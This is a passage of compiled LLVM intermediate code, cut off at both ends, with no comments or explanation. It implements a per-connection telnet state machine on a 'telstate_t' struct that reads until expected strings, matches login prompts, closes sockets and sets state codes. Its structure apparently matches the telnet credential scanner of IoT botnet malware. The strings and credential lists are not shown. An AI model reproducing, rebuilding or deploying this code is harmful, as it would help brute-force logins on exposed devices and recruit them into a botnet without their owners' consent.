  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1343, i32 0, i32 3
  store i8 0, i8* %1344, align 1
  br label %2093

; <label>:1345:                                   ; preds = %1309
  %1346 = load i32, i32* %2, align 4
  %1347 = sext i32 %1346 to i64
  %1348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1347
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1348, i32 0, i32 8
  %1350 = load i8*, i8** %1349, align 8
  %1351 = call i32 @matchPrompt(i8* %1350)
  %1352 = icmp ne i32 %1351, 0
  br i1 %1352, label %1373, label %1353

; <label>:1353:                                   ; preds = %1345
  %1354 = load i32, i32* %2, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 8
  %1358 = load i8*, i8** %1357, align 8
  call void @llvm.memset.p0i8.i64(i8* %1358, i8 0, i64 1024, i32 1, i1 false)
  %1359 = load i32, i32* %2, align 4
  %1360 = sext i32 %1359 to i64
  %1361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1360
  %1362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1361, i32 0, i32 0
  %1363 = load i32, i32* %1362, align 16
  %1364 = call i32 @sclose(i32 %1363)
  %1365 = load i32, i32* %2, align 4
  %1366 = sext i32 %1365 to i64
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1366
  %1368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1367, i32 0, i32 2
  store i8 0, i8* %1368, align 8
  %1369 = load i32, i32* %2, align 4
  %1370 = sext i32 %1369 to i64
  %1371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1370
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1371, i32 0, i32 3
  store i8 1, i8* %1372, align 1
  br label %2093

; <label>:1373:                                   ; preds = %1345
  %1374 = load i32, i32* %2, align 4
  %1375 = sext i32 %1374 to i64
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1375
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1376, i32 0, i32 2
  store i8 7, i8* %1377, align 8
  br label %1378

; <label>:1378:                                   ; preds = %1373
  %1379 = load i32, i32* %2, align 4
  %1380 = sext i32 %1379 to i64
  %1381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1380
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1381, i32 0, i32 8
  %1383 = load i8*, i8** %1382, align 8
  call void @llvm.memset.p0i8.i64(i8* %1383, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:1384:                                   ; preds = %1290
  %1385 = load i32, i32* %2, align 4
  %1386 = sext i32 %1385 to i64
  %1387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1386
  %1388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1387, i32 0, i32 0
  %1389 = load i32, i32* %1388, align 16
  %1390 = load i32, i32* %2, align 4
  %1391 = sext i32 %1390 to i64
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1391
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1392, i32 0, i32 8
  %1394 = load i8*, i8** %1393, align 8
  %1395 = load i32, i32* %2, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1396
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1397, i32 0, i32 7
  %1399 = load i16, i16* %1398, align 16
  %1400 = zext i16 %1399 to i32
  %1401 = call i32 @readUntil(i32 %1389, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1394, i32 1024, i32 %1400)
  %1402 = icmp ne i32 %1401, 0
  br i1 %1402, label %1403, label %1478

; <label>:1403:                                   ; preds = %1384
  %1404 = load i32, i32* %2, align 4
  %1405 = sext i32 %1404 to i64
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1405
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1406, i32 0, i32 6
  store i32 0, i32* %1407, align 4
  %1408 = load i32, i32* %2, align 4
  %1409 = sext i32 %1408 to i64
  %1410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1409
  %1411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1410, i32 0, i32 7
  store i16 0, i16* %1411, align 16
  %1412 = load i32, i32* %2, align 4
  %1413 = sext i32 %1412 to i64
  %1414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1413
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1414, i32 0, i32 8
  %1416 = load i8*, i8** %1415, align 8
  %1417 = call i8* @strstr(i8* %1416, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %1418 = icmp ne i8* %1417, null
  br i1 %1418, label %1419, label %1439

; <label>:1419:                                   ; preds = %1403
  %1420 = load i32, i32* %2, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1421
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1422, i32 0, i32 8
  %1424 = load i8*, i8** %1423, align 8
  call void @llvm.memset.p0i8.i64(i8* %1424, i8 0, i64 1024, i32 1, i1 false)
  %1425 = load i32, i32* %2, align 4
  %1426 = sext i32 %1425 to i64
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1426
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1427, i32 0, i32 0
  %1429 = load i32, i32* %1428, align 16
  %1430 = call i32 @sclose(i32 %1429)
  %1431 = load i32, i32* %2, align 4
  %1432 = sext i32 %1431 to i64
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1432
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1433, i32 0, i32 2
  store i8 0, i8* %1434, align 8
  %1435 = load i32, i32* %2, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1436
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1437, i32 0, i32 3
  store i8 0, i8* %1438, align 1
  br label %2093

; <label>:1439:                                   ; preds = %1403
  %1440 = load i32, i32* %2, align 4
  %1441 = sext i32 %1440 to i64
  %1442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1441
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1442, i32 0, i32 8
  %1444 = load i8*, i8** %1443, align 8
  %1445 = call i32 @matchPrompt(i8* %1444)
  %1446 = icmp ne i32 %1445, 0
  br i1 %1446, label %1467, label %1447

; <label>:1447:                                   ; preds = %1439
  %1448 = load i32, i32* %2, align 4
  %1449 = sext i32 %1448 to i64
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1449
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1450, i32 0, i32 8
  %1452 = load i8*, i8** %1451, align 8
  call void @llvm.memset.p0i8.i64(i8* %1452, i8 0, i64 1024, i32 1, i1 false)
  %1453 = load i32, i32* %2, align 4
  %1454 = sext i32 %1453 to i64
  %1455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1454
  %1456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1455, i32 0, i32 0
  %1457 = load i32, i32* %1456, align 16
  %1458 = call i32 @sclose(i32 %1457)
  %1459 = load i32, i32* %2, align 4
  %1460 = sext i32 %1459 to i64
  %1461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1460
  %1462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1461, i32 0, i32 2
  store i8 0, i8* %1462, align 8
  %1463 = load i32, i32* %2, align 4
  %1464 = sext i32 %1463 to i64
  %1465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1464
  %1466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1465, i32 0, i32 3
  store i8 1, i8* %1466, align 1
  br label %2093

; <label>:1467:                                   ; preds = %1439
  %1468 = load i32, i32* %2, align 4
  %1469 = sext i32 %1468 to i64
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1469
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1470, i32 0, i32 2
  store i8 7, i8* %1471, align 8
  br label %1472

; <label>:1472:                                   ; preds = %1467
  %1473 = load i32, i32* %2, align 4
  %1474 = sext i32 %1473 to i64
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1474
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1475, i32 0, i32 8
  %1477 = load i8*, i8** %1476, align 8
  call void @llvm.memset.p0i8.i64(i8* %1477, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:1478:                                   ; preds = %1384
  %1479 = load i32, i32* %2, align 4
  %1480 = sext i32 %1479 to i64
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1480
  %1482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1481, i32 0, i32 0
  %1483 = load i32, i32* %1482, align 16
  %1484 = load i32, i32* %2, align 4
  %1485 = sext i32 %1484 to i64
  %1486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1485
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1486, i32 0, i32 8
  %1488 = load i8*, i8** %1487, align 8
  %1489 = load i32, i32* %2, align 4
  %1490 = sext i32 %1489 to i64
  %1491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1490
  %1492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1491, i32 0, i32 7
  %1493 = load i16, i16* %1492, align 16
  %1494 = zext i16 %1493 to i32
  %1495 = call i32 @readUntil(i32 %1483, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1488, i32 1024, i32 %1494)
  %1496 = icmp ne i32 %1495, 0
  br i1 %1496, label %1497, label %1572

; <label>:1497:                                   ; preds = %1478
  %1498 = load i32, i32* %2, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1499
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1500, i32 0, i32 6
  store i32 0, i32* %1501, align 4
  %1502 = load i32, i32* %2, align 4
  %1503 = sext i32 %1502 to i64
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1503
  %1505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1504, i32 0, i32 7
  store i16 0, i16* %1505, align 16
  %1506 = load i32, i32* %2, align 4
  %1507 = sext i32 %1506 to i64
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1507
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1508, i32 0, i32 8
  %1510 = load i8*, i8** %1509, align 8
  %1511 = call i8* @strstr(i8* %1510, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %1512 = icmp ne i8* %1511, null
  br i1 %1512, label %1513, label %1533

; <label>:1513:                                   ; preds = %1497
  %1514 = load i32, i32* %2, align 4
  %1515 = sext i32 %1514 to i64
  %1516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1515
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1516, i32 0, i32 8
  %1518 = load i8*, i8** %1517, align 8
  call void @llvm.memset.p0i8.i64(i8* %1518, i8 0, i64 1024, i32 1, i1 false)
  %1519 = load i32, i32* %2, align 4
  %1520 = sext i32 %1519 to i64
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1520
  %1522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1521, i32 0, i32 0
  %1523 = load i32, i32* %1522, align 16
  %1524 = call i32 @sclose(i32 %1523)
  %1525 = load i32, i32* %2, align 4
  %1526 = sext i32 %1525 to i64
  %1527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1526
  %1528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1527, i32 0, i32 2
  store i8 0, i8* %1528, align 8
  %1529 = load i32, i32* %2, align 4
  %1530 = sext i32 %1529 to i64
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1530
  %1532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1531, i32 0, i32 3
  store i8 0, i8* %1532, align 1
  br label %2093

; <label>:1533:                                   ; preds = %1497
  %1534 = load i32, i32* %2, align 4
  %1535 = sext i32 %1534 to i64
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1535
  %1537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1536, i32 0, i32 8
  %1538 = load i8*, i8** %1537, align 8
  %1539 = call i32 @matchPrompt(i8* %1538)
  %1540 = icmp ne i32 %1539, 0
  br i1 %1540, label %1561, label %1541

; <label>:1541:                                   ; preds = %1533
  %1542 = load i32, i32* %2, align 4
  %1543 = sext i32 %1542 to i64
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1543
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1544, i32 0, i32 8
  %1546 = load i8*, i8** %1545, align 8
  call void @llvm.memset.p0i8.i64(i8* %1546, i8 0, i64 1024, i32 1, i1 false)
  %1547 = load i32, i32* %2, align 4
  %1548 = sext i32 %1547 to i64
  %1549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1548
  %1550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1549, i32 0, i32 0
  %1551 = load i32, i32* %1550, align 16
  %1552 = call i32 @sclose(i32 %1551)
  %1553 = load i32, i32* %2, align 4
  %1554 = sext i32 %1553 to i64
  %1555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1554
  %1556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1555, i32 0, i32 2
  store i8 0, i8* %1556, align 8
  %1557 = load i32, i32* %2, align 4
  %1558 = sext i32 %1557 to i64
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1558
  %1560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1559, i32 0, i32 3
  store i8 1, i8* %1560, align 1
  br label %2093

; <label>:1561:                                   ; preds = %1533
  %1562 = load i32, i32* %2, align 4
  %1563 = sext i32 %1562 to i64
  %1564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1563
  %1565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1564, i32 0, i32 2
  store i8 7, i8* %1565, align 8
  br label %1566

; <label>:1566:                                   ; preds = %1561
  %1567 = load i32, i32* %2, align 4
  %1568 = sext i32 %1567 to i64
  %1569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1568
  %1570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1569, i32 0, i32 8
  %1571 = load i8*, i8** %1570, align 8
  call void @llvm.memset.p0i8.i64(i8* %1571, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:1572:                                   ; preds = %1478
  %1573 = load i32, i32* %2, align 4
  %1574 = sext i32 %1573 to i64
  %1575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1574
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1575, i32 0, i32 0
  %1577 = load i32, i32* %1576, align 16
  %1578 = load i32, i32* %2, align 4
  %1579 = sext i32 %1578 to i64
  %1580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1579
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1580, i32 0, i32 8
  %1582 = load i8*, i8** %1581, align 8
  %1583 = load i32, i32* %2, align 4
  %1584 = sext i32 %1583 to i64
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1584
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 7
  %1587 = load i16, i16* %1586, align 16
  %1588 = zext i16 %1587 to i32
  %1589 = call i32 @readUntil(i32 %1577, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1582, i32 1024, i32 %1588)
  %1590 = icmp ne i32 %1589, 0
  br i1 %1590, label %1591, label %1666

; <label>:1591:                                   ; preds = %1572
  %1592 = load i32, i32* %2, align 4
  %1593 = sext i32 %1592 to i64
  %1594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1593
  %1595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1594, i32 0, i32 6
  store i32 0, i32* %1595, align 4
  %1596 = load i32, i32* %2, align 4
  %1597 = sext i32 %1596 to i64
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1597
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1598, i32 0, i32 7
  store i16 0, i16* %1599, align 16
  %1600 = load i32, i32* %2, align 4
  %1601 = sext i32 %1600 to i64
  %1602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1601
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1602, i32 0, i32 8
  %1604 = load i8*, i8** %1603, align 8
  %1605 = call i8* @strstr(i8* %1604, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %1606 = icmp ne i8* %1605, null
  br i1 %1606, label %1607, label %1627

; <label>:1607:                                   ; preds = %1591
  %1608 = load i32, i32* %2, align 4
  %1609 = sext i32 %1608 to i64
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1609
  %1611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1610, i32 0, i32 8
  %1612 = load i8*, i8** %1611, align 8
  call void @llvm.memset.p0i8.i64(i8* %1612, i8 0, i64 1024, i32 1, i1 false)
  %1613 = load i32, i32* %2, align 4
  %1614 = sext i32 %1613 to i64
  %1615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1614
  %1616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1615, i32 0, i32 0
  %1617 = load i32, i32* %1616, align 16
  %1618 = call i32 @sclose(i32 %1617)
  %1619 = load i32, i32* %2, align 4
  %1620 = sext i32 %1619 to i64
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1620
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1621, i32 0, i32 2
  store i8 0, i8* %1622, align 8
  %1623 = load i32, i32* %2, align 4
  %1624 = sext i32 %1623 to i64
  %1625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1624
  %1626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1625, i32 0, i32 3
  store i8 0, i8* %1626, align 1
  br label %2093

; <label>:1627:                                   ; preds = %1591
  %1628 = load i32, i32* %2, align 4
  %1629 = sext i32 %1628 to i64
  %1630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1629
  %1631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1630, i32 0, i32 8
  %1632 = load i8*, i8** %1631, align 8
  %1633 = call i32 @matchPrompt(i8* %1632)
  %1634 = icmp ne i32 %1633, 0
  br i1 %1634, label %1655, label %1635

; <label>:1635:                                   ; preds = %1627
  %1636 = load i32, i32* %2, align 4
  %1637 = sext i32 %1636 to i64
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1637
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1638, i32 0, i32 8
  %1640 = load i8*, i8** %1639, align 8
  call void @llvm.memset.p0i8.i64(i8* %1640, i8 0, i64 1024, i32 1, i1 false)
  %1641 = load i32, i32* %2, align 4
  %1642 = sext i32 %1641 to i64
  %1643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1642
  %1644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1643, i32 0, i32 0
  %1645 = load i32, i32* %1644, align 16
  %1646 = call i32 @sclose(i32 %1645)
  %1647 = load i32, i32* %2, align 4
  %1648 = sext i32 %1647 to i64
  %1649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1648
  %1650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1649, i32 0, i32 2
  store i8 0, i8* %1650, align 8
  %1651 = load i32, i32* %2, align 4
  %1652 = sext i32 %1651 to i64
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1652
  %1654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1653, i32 0, i32 3
  store i8 1, i8* %1654, align 1
  br label %2093

; <label>:1655:                                   ; preds = %1627
  %1656 = load i32, i32* %2, align 4
  %1657 = sext i32 %1656 to i64
  %1658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1657
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1658, i32 0, i32 2
  store i8 7, i8* %1659, align 8
  br label %1660

; <label>:1660:                                   ; preds = %1655
  %1661 = load i32, i32* %2, align 4
  %1662 = sext i32 %1661 to i64
  %1663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1662
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1663, i32 0, i32 8
  %1665 = load i8*, i8** %1664, align 8
  call void @llvm.memset.p0i8.i64(i8* %1665, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:1666:                                   ; preds = %1572
  %1667 = load i32, i32* %2, align 4
  %1668 = sext i32 %1667 to i64
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1668
  %1670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1669, i32 0, i32 0
  %1671 = load i32, i32* %1670, align 16
  %1672 = load i32, i32* %2, align 4
  %1673 = sext i32 %1672 to i64
  %1674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1673
  %1675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1674, i32 0, i32 8
  %1676 = load i8*, i8** %1675, align 8
  %1677 = load i32, i32* %2, align 4
  %1678 = sext i32 %1677 to i64
  %1679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1678
  %1680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1679, i32 0, i32 7
  %1681 = load i16, i16* %1680, align 16
  %1682 = zext i16 %1681 to i32
  %1683 = call i32 @readUntil(i32 %1671, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1676, i32 1024, i32 %1682)
  %1684 = icmp ne i32 %1683, 0
  br i1 %1684, label %1685, label %1760

; <label>:1685:                                   ; preds = %1666
  %1686 = load i32, i32* %2, align 4
  %1687 = sext i32 %1686 to i64
  %1688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1687
  %1689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1688, i32 0, i32 6
  store i32 0, i32* %1689, align 4
  %1690 = load i32, i32* %2, align 4
  %1691 = sext i32 %1690 to i64
  %1692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1691
  %1693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1692, i32 0, i32 7
  store i16 0, i16* %1693, align 16
  %1694 = load i32, i32* %2, align 4
  %1695 = sext i32 %1694 to i64
  %1696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1695
  %1697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1696, i32 0, i32 8
  %1698 = load i8*, i8** %1697, align 8
  %1699 = call i8* @strstr(i8* %1698, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %1700 = icmp ne i8* %1699, null
  br i1 %1700, label %1701, label %1721

; <label>:1701:                                   ; preds = %1685
  %1702 = load i32, i32* %2, align 4
  %1703 = sext i32 %1702 to i64
  %1704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1703
  %1705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1704, i32 0, i32 8
  %1706 = load i8*, i8** %1705, align 8
  call void @llvm.memset.p0i8.i64(i8* %1706, i8 0, i64 1024, i32 1, i1 false)
  %1707 = load i32, i32* %2, align 4
  %1708 = sext i32 %1707 to i64
  %1709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1708
  %1710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1709, i32 0, i32 0
  %1711 = load i32, i32* %1710, align 16
  %1712 = call i32 @sclose(i32 %1711)
  %1713 = load i32, i32* %2, align 4
  %1714 = sext i32 %1713 to i64
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1714
  %1716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1715, i32 0, i32 2
  store i8 0, i8* %1716, align 8
  %1717 = load i32, i32* %2, align 4
  %1718 = sext i32 %1717 to i64
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1718
  %1720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1719, i32 0, i32 3
  store i8 0, i8* %1720, align 1
  br label %2093

; <label>:1721:                                   ; preds = %1685
  %1722 = load i32, i32* %2, align 4
  %1723 = sext i32 %1722 to i64
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1724, i32 0, i32 8
  %1726 = load i8*, i8** %1725, align 8
  %1727 = call i32 @matchPrompt(i8* %1726)
  %1728 = icmp ne i32 %1727, 0
  br i1 %1728, label %1749, label %1729

; <label>:1729:                                   ; preds = %1721
  %1730 = load i32, i32* %2, align 4
  %1731 = sext i32 %1730 to i64
  %1732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1731
  %1733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1732, i32 0, i32 8
  %1734 = load i8*, i8** %1733, align 8
  call void @llvm.memset.p0i8.i64(i8* %1734, i8 0, i64 1024, i32 1, i1 false)
  %1735 = load i32, i32* %2, align 4
  %1736 = sext i32 %1735 to i64
  %1737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1736
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1737, i32 0, i32 0
  %1739 = load i32, i32* %1738, align 16
  %1740 = call i32 @sclose(i32 %1739)
  %1741 = load i32, i32* %2, align 4
  %1742 = sext i32 %1741 to i64
  %1743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1742
  %1744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1743, i32 0, i32 2
  store i8 0, i8* %1744, align 8
  %1745 = load i32, i32* %2, align 4
  %1746 = sext i32 %1745 to i64
  %1747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1746
  %1748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1747, i32 0, i32 3
  store i8 1, i8* %1748, align 1
  br label %2093

; <label>:1749:                                   ; preds = %1721
  %1750 = load i32, i32* %2, align 4
  %1751 = sext i32 %1750 to i64
  %1752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1751
  %1753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1752, i32 0, i32 2
  store i8 7, i8* %1753, align 8
  br label %1754

; <label>:1754:                                   ; preds = %1749
  %1755 = load i32, i32* %2, align 4
  %1756 = sext i32 %1755 to i64
  %1757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1756
  %1758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1757, i32 0, i32 8
  %1759 = load i8*, i8** %1758, align 8
  call void @llvm.memset.p0i8.i64(i8* %1759, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:1760:                                   ; preds = %1666
  %1761 = load i32, i32* %2, align 4
  %1762 = sext i32 %1761 to i64
  %1763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1762
  %1764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1763, i32 0, i32 0
  %1765 = load i32, i32* %1764, align 16
  %1766 = load i32, i32* %2, align 4
  %1767 = sext i32 %1766 to i64
  %1768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1767
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1768, i32 0, i32 8
  %1770 = load i8*, i8** %1769, align 8
  %1771 = load i32, i32* %2, align 4
  %1772 = sext i32 %1771 to i64
